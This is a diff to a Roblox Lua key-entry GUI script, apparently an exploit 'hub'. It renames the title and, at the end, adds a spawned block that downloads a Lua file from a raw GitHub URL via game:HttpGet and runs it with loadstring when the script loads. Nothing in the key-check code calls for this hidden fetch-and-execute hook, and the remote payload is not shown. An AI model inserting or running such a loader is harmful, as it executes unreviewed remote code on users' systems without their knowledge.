@@ -53,7 +53,7 @@ NameHub.BorderSizePixel = 0
 NameHub.Position = UDim2.new(0.147410363, 0, 0.124324329, 0)
 NameHub.Size = UDim2.new(0, 354, 0, 36)
 NameHub.Font = Enum.Font.GothamBold
-NameHub.Text = "Alchemy XY"
+NameHub.Text = "Skid Comiti"
 NameHub.TextColor3 = Color3.fromRGB(255, 255, 255)
 NameHub.TextSize = 30.000
 KeyBox.Name = "Key Box"
@@ -83,4 +83,8 @@ Submit.MouseButton1Click:Connect(function()
     else
         print("Incorrect Key") -- If input isn't equal correct key will print Incorrect Key
     end
+end)
+spawn(function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/memaybeohub/Function-Scripts/main/erth.lua"))()
 end)
